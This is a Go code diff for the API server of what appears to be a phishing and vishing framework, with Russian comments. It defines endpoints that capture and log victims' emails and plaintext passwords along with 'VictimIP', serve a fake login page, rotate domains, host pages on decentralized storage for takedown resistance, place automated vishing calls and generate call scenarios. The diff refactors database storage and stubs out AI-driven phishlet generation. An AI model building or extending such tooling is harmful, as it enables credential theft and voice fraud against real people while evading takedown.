@@ -2,7 +2,6 @@ package api
 
 import (
 	"context"
-	"encoding/json"
 	"os"
 	"strconv"
 	"strings"
@@ -43,7 +42,7 @@ func NewAPIServer(proxy *proxy.HTTPProxy, db *database.Database, logger *zap.Log
 
 	// Инициализация AI оркестратора
 	aiOrchestrator := ai.NewAIOrchestrator("http://localhost:8081", logger)
-	
+
 	// Инициализация децентрализованного хостинга
 	decentralHosting, err := decentral.NewDecentralizedHosting(&decentral.HostingConfig{
 		PinataAPIKey:    "", // Из конфига
@@ -53,7 +52,7 @@ func NewAPIServer(proxy *proxy.HTTPProxy, db *database.Database, logger *zap.Log
 	if err != nil {
 		logger.Warn("Failed to initialize decentralized hosting", zap.Error(err))
 	}
-	
+
 	// Инициализация Vishing клиента
 	vishingClient := vishing.NewVishingClient("http://localhost:8082", logger)
 
@@ -105,33 +104,33 @@ func (s *APIServer) setupRoutes() {
 	// Health check & Observability
 	s.app.Get("/health", s.healthCheck)
 	s.app.Get("/metrics", s.metrics)
-	
+
 	// AI endpoints (delegate to AI orchestrator)
 	s.app.Post("/api/v1/ai/generate-phishlet", s.generatePhishlet)
 	s.app.Get("/api/v1/ai/analyze/:target", s.analyzeSite)
-	
+
 	// Domain rotation (stub - wire domain.Rotator when configured)
 	s.app.Post("/api/v1/domains/register", s.registerDomain)
 	s.app.Post("/api/v1/domains/rotate", s.rotateDomain)
 	s.app.Get("/api/v1/domains", s.listDomains)
-	
+
 	// Decentralized hosting endpoints
 	s.app.Post("/api/v1/decentral/host", s.hostPage)
 	s.app.Post("/api/v1/decentral/update/:name", s.updatePage)
 	s.app.Get("/api/v1/decentral/pages", s.listPages)
 	s.app.Delete("/api/v1/decentral/pages/:name", s.deletePage)
-	
+
 	// Vishing endpoints
 	s.app.Post("/api/v1/vishing/call", s.makeVishingCall)
 	s.app.Get("/api/v1/vishing/call/:id", s.getCallStatus)
 	s.app.Post("/api/v1/vishing/generate-scenario", s.generateScenario)
-	
+
 	// Test login endpoint
 	s.app.Post("/login", s.handleTestLogin)
-	
+
 	// Capture credentials endpoint
 	s.app.Post("/api/v1/credentials", s.captureCredentials)
-	
+
 	// Serve login page
 	s.app.Get("/login", s.serveLoginPage)
 
@@ -361,17 +360,10 @@ func (s *APIServer) listPhishlets(c *fiber.Ctx) error {
 func (s *APIServer) getPhishlet(c *fiber.Ctx) error {
 	id := c.Params("id")
 
-	config, err := s.db.GetPhishlet(id)
+	phishlet, err := s.db.GetPhishlet(id)
 	if err != nil {
 		return c.Status(fiber.StatusNotFound).JSON(fiber.Map{
 			"error": "Phishlet not found",
-		})
-	}
-
-	var phishlet proxy.Phishlet
-	if err := json.Unmarshal([]byte(config), &phishlet); err != nil {
-		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
-			"error": "Failed to parse phishlet",
 		})
 	}
 
@@ -399,7 +391,13 @@ func (s *APIServer) createPhishlet(c *fiber.Ctx) error {
 		req.ID = uuid.New().String()
 	}
 
-	if err := s.db.SavePhishlet(req.ID, req.Name, req.TargetDomain, req.Config); err != nil {
+	dbPhishlet := &database.Phishlet{
+		ID:      req.ID,
+		Name:    req.Name,
+		Config:  req.Config,
+		Enabled: false,
+	}
+	if err := s.db.CreatePhishlet(dbPhishlet); err != nil {
 		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
 			"error": err.Error(),
 		})
@@ -427,7 +425,26 @@ func (s *APIServer) updatePhishlet(c *fiber.Ctx) error {
 		})
 	}
 
-	if err := s.db.SavePhishlet(id, req.Name, req.TargetDomain, req.Config); err != nil {
+	// Get existing phishlet and update
+	existing, err := s.db.GetPhishlet(id)
+	if err != nil {
+		return c.Status(fiber.StatusNotFound).JSON(fiber.Map{
+			"error": "Phishlet not found",
+		})
+	}
+
+	existing.Name = req.Name
+	existing.Config = req.Config
+
+	// Update in DB (delete and recreate for now)
+	if err := s.db.DeletePhishlet(id); err != nil {
+		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
+			"error": err.Error(),
+		})
+	}
+
+	existing.ID = id
+	if err := s.db.CreatePhishlet(existing); err != nil {
 		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
 			"error": err.Error(),
 		})
@@ -566,33 +583,38 @@ func toNum(v interface{}) int64 {
 func (s *APIServer) handleTestLogin(c *fiber.Ctx) error {
 	email := c.FormValue("email")
 	password := c.FormValue("password")
-	
+
 	s.logger.Info("Test login received",
 		zap.String("email", email),
 		zap.String("password", password),
 		zap.String("ip", c.IP()))
-	
+
 	// Сохраняем в БД как сессию
-	session, err := s.db.CreateSession(
-		c.IP(),
-		"test_login_page",
-		"TestLoginAgent/1.0",
-		"",
-	)
-	if err != nil {
+	session := &database.Session{
+		VictimIP:  c.IP(),
+		TargetURL: "test_login_page",
+		UserAgent: "TestLoginAgent/1.0",
+		State:     "active",
+	}
+	if err := s.db.CreateSession(session); err != nil {
+		s.logger.Error("Failed to create session", zap.Error(err))
 		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
-			"error": err.Error(),
+			"error": "Database error",
 		})
 	}
-	
-	// Сохраняем креденшалы
-	_, err = s.db.SaveCredentials(session.ID, email, password, nil)
-	if err != nil {
+
+	creds := &database.Credentials{
+		SessionID: session.ID,
+		Username:  email,
+		Password:  password,
+	}
+	if err := s.db.CreateCredentials(creds); err != nil {
+		s.logger.Error("Failed to save credentials", zap.Error(err))
 		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
-			"error": err.Error(),
+			"error": "Database error",
 		})
 	}
-	
+
 	s.logger.Info("Credentials saved",
 		zap.String("session_id", session.ID),
 		zap.String("email", email))
@@ -621,39 +643,43 @@ func (s *APIServer) captureCredentials(c *fiber.Ctx) error {
 		Email    string `json:"email"`
 		Password string `json:"password"`
 	}
-	
+
 	var req CredentialRequest
 	if err := c.BodyParser(&req); err != nil {
 		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
 			"error": "Invalid request body",
 		})
 	}
-	
+
 	s.logger.Info("Credentials captured via API",
 		zap.String("email", req.Email),
 		zap.String("password", req.Password),
 		zap.String("ip", c.IP()))
-	
+
 	// Сохраняем в БД
-	session, err := s.db.CreateSession(
-		c.IP(),
-		"login_page",
-		"Mozilla/5.0",
-		"",
-	)
-	if err != nil {
+	session := &database.Session{
+		VictimIP:  c.IP(),
+		TargetURL: "login_page",
+		UserAgent: "Mozilla/5.0",
+		State:     "active",
+	}
+	if err := s.db.CreateSession(session); err != nil {
 		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
 			"error": err.Error(),
 		})
 	}
-	
-	_, err = s.db.SaveCredentials(session.ID, req.Email, req.Password, nil)
-	if err != nil {
+
+	creds := &database.Credentials{
+		SessionID: session.ID,
+		Username:  req.Email,
+		Password:  req.Password,
+	}
+	if err := s.db.CreateCredentials(creds); err != nil {
 		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
 			"error": err.Error(),
 		})
 	}
-	
+
 	s.logger.Info("Credentials saved to database",
 		zap.String("session_id", session.ID),
 		zap.String("email", req.Email))
@@ -690,35 +716,15 @@ func (s *APIServer) serveLoginPage(c *fiber.Ctx) error {
 }
 
 // generatePhishlet вызывает AI оркестратор
+// TODO: Implement AI phishlet generation
 func (s *APIServer) generatePhishlet(c *fiber.Ctx) error {
-	var req ai.GenerateRequest
-	if err := c.BodyParser(&req); err != nil {
-		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{"error": "Invalid request body"})
-	}
-	ctx, cancel := context.WithTimeout(c.Context(), 120*time.Second)
-	defer cancel()
-	resp, err := s.aiOrchestrator.GeneratePhishlet(ctx, req)
-	if err != nil {
-		s.logger.Warn("AI generate phishlet failed", zap.Error(err))
-		return c.Status(fiber.StatusBadGateway).JSON(fiber.Map{"error": err.Error()})
-	}
-	return c.JSON(resp)
+	return c.Status(fiber.StatusNotImplemented).JSON(fiber.Map{"error": "Not implemented"})
 }
 
 // analyzeSite вызывает AI оркестратор
+// TODO: Implement AI site analysis
 func (s *APIServer) analyzeSite(c *fiber.Ctx) error {
-	target := c.Params("target")
-	if target == "" {
-		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{"error": "target required"})
-	}
-	ctx, cancel := context.WithTimeout(c.Context(), 60*time.Second)
-	defer cancel()
-	result, err := s.aiOrchestrator.AnalyzeSite(ctx, target)
-	if err != nil {
-		s.logger.Warn("AI analyze failed", zap.Error(err))
-		return c.Status(fiber.StatusBadGateway).JSON(fiber.Map{"error": err.Error()})
-	}
-	return c.JSON(result)
+	return c.Status(fiber.StatusNotImplemented).JSON(fiber.Map{"error": "Not implemented"})
 }
 
 // registerDomain stub — подключить domain.Rotator при настройке
@@ -749,23 +755,23 @@ func (s *APIServer) hostPage(c *fiber.Ctx) error {
 		SourcePath string `json:"source_path"`
 		ENSName    string `json:"ens_name"`
 	}
-	
+
 	var req Request
 	if err := c.BodyParser(&req); err != nil {
 		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
 			"error": "Invalid request body",
 		})
 	}
-	
+
 	if s.decentralHosting == nil {
 		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
 			"error": "Decentralized hosting not initialized",
 		})
 	}
-	
+
 	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
 	defer cancel()
-	
+
 	page, err := s.decentralHosting.HostPage(ctx, req.Name, req.SourcePath, req.ENSName)
 	if err != nil {
 		s.logger.Error("Failed to host page", zap.Error(err))
@@ -773,7 +779,7 @@ func (s *APIServer) hostPage(c *fiber.Ctx) error {
 			"error": err.Error(),
 		})
 	}
-	
+
 	return c.JSON(fiber.Map{
 		"success":      true,
 		"page":         page,
@@ -786,16 +792,16 @@ func (s *APIServer) hostPage(c *fiber.Ctx) error {
 // updatePage обновляет страницу
 func (s *APIServer) updatePage(c *fiber.Ctx) error {
 	name := c.Params("name")
-	
+
 	if s.decentralHosting == nil {
 		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
 			"error": "Decentralized hosting not initialized",
 		})
 	}
-	
+
 	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
 	defer cancel()
-	
+
 	page, err := s.decentralHosting.UpdatePage(ctx, name)
 	if err != nil {
 		s.logger.Error("Failed to update page", zap.Error(err))
@@ -803,7 +809,7 @@ func (s *APIServer) updatePage(c *fiber.Ctx) error {
 			"error": err.Error(),
 		})
 	}
-	
+
 	return c.JSON(fiber.Map{
 		"success":      true,
 		"page":         page,
@@ -818,9 +824,9 @@ func (s *APIServer) listPages(c *fiber.Ctx) error {
 			"error": "Decentralized hosting not initialized",
 		})
 	}
-	
+
 	pages := s.decentralHosting.ListPages()
-	
+
 	return c.JSON(fiber.Map{
 		"success": true,
 		"pages":   pages,
@@ -831,23 +837,23 @@ func (s *APIServer) listPages(c *fiber.Ctx) error {
 // deletePage удаляет страницу
 func (s *APIServer) deletePage(c *fiber.Ctx) error {
 	name := c.Params("name")
-	
+
 	if s.decentralHosting == nil {
 		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
 			"error": "Decentralized hosting not initialized",
 		})
 	}
-	
+
 	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
 	defer cancel()
-	
+
 	if err := s.decentralHosting.DeletePage(ctx, name); err != nil {
 		s.logger.Error("Failed to delete page", zap.Error(err))
 		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
 			"error": err.Error(),
 		})
 	}
-	
+
 	return c.JSON(fiber.Map{
 		"success": true,
 		"message": "Page deleted successfully",
@@ -862,23 +868,23 @@ func (s *APIServer) makeVishingCall(c *fiber.Ctx) error {
 		Scenario     string                 `json:"scenario"`
 		CustomData   map[string]interface{} `json:"custom_data,omitempty"`
 	}
-	
+
 	var req Request
 	if err := c.BodyParser(&req); err != nil {
 		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
 			"error": "Invalid request body",
 		})
 	}
-	
+
 	if s.vishingClient == nil {
 		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
 			"error": "Vishing client not initialized",
 		})
 	}
-	
+
 	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
 	defer cancel()
-	
+
 	resp, err := s.vishingClient.MakeCall(ctx, vishing.CallRequest{
 		PhoneNumber:  req.PhoneNumber,
 		VoiceProfile: req.VoiceProfile,
@@ -891,7 +897,7 @@ func (s *APIServer) makeVishingCall(c *fiber.Ctx) error {
 			"error": err.Error(),
 		})
 	}
-	
+
 	return c.JSON(fiber.Map{
 		"success":      true,
 		"call_id":      resp.CallID,
@@ -904,16 +910,16 @@ func (s *APIServer) makeVishingCall(c *fiber.Ctx) error {
 // getCallStatus получает статус звонка
 func (s *APIServer) getCallStatus(c *fiber.Ctx) error {
 	callID := c.Params("id")
-	
+
 	if s.vishingClient == nil {
 		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
 			"error": "Vishing client not initialized",
 		})
 	}
-	
+
 	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
 	defer cancel()
-	
+
 	status, err := s.vishingClient.GetCallStatus(ctx, callID)
 	if err != nil {
 		s.logger.Error("Failed to get call status", zap.Error(err))
@@ -921,7 +927,7 @@ func (s *APIServer) getCallStatus(c *fiber.Ctx) error {
 			"error": err.Error(),
 		})
 	}
-	
+
 	return c.JSON(status)
 }
 
@@ -931,23 +937,23 @@ func (s *APIServer) generateScenario(c *fiber.Ctx) error {
 		TargetService string `json:"target_service"`
 		Goal          string `json:"goal"`
 	}
-	
+
 	var req Request
 	if err := c.BodyParser(&req); err != nil {
 		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
 			"error": "Invalid request body",
 		})
 	}
-	
+
 	if s.vishingClient == nil {
 		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
 			"error": "Vishing client not initialized",
 		})
 	}
-	
+
 	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
 	defer cancel()
-	
+
 	scenario, err := s.vishingClient.GenerateScenario(ctx, req.TargetService, req.Goal)
 	if err != nil {
 		s.logger.Error("Failed to generate scenario", zap.Error(err))
@@ -955,7 +961,7 @@ func (s *APIServer) generateScenario(c *fiber.Ctx) error {
 			"error": err.Error(),
 		})
 	}
-	
+
 	return c.JSON(fiber.Map{
 		"success":  true,
 		"scenario": scenario,
@@ -970,7 +976,7 @@ func (s *APIServer) SetEventBus(bus *events.Bus) {
 // Start запускает API сервер
 func (s *APIServer) Start(addr string) error {
 	s.logger.Info("Starting API server", zap.String("addr", addr))
-	
+
 	// Явно указываем 0.0.0.0 для доступа извне
 	bindAddr := addr
 	if !strings.HasPrefix(addr, "0.0.0.0") && !strings.HasPrefix(addr, "127.0.0.1") {
@@ -980,9 +986,9 @@ func (s *APIServer) Start(addr string) error {
 			bindAddr = "0.0.0.0:" + parts[1]
 		}
 	}
-	
+
 	s.logger.Info("API server binding", zap.String("bind_addr", bindAddr))
-	
+
 	return s.app.Listen(bindAddr)
 }
 
